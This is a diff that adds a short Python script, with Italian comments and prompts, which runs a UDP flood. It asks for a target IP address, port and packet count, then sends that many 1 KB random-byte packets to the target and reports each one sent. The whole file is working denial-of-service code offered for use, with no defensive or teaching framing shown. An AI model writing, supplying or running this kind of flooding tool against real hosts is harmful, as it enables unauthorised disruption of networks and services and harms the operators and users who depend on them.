@@ -1,0 +1,26 @@
+import socket
+import random
+
+def udp_flood():
+    # Input utente
+    target_ip = input("Inserisci IP target: ")
+    target_port = int(input("Inserisci porta UDP target: "))
+    num_packets = int(input("Numero di pacchetti da inviare: "))
+
+    # Creazione socket UDP
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    # Payload da 1 KB (1024 byte)
+    payload = random.randbytes(1024)
+
+    print(f"\nInizio UDP flood verso {target_ip}:{target_port}\n")
+
+    for i in range(1, num_packets + 1):
+        sock.sendto(payload, (target_ip, target_port))
+        print(f"Pacchetto {i} inviato")
+
+    print("\nInvio completato.")
+    sock.close()
+
+if __name__ == "__main__":
+    udp_flood()
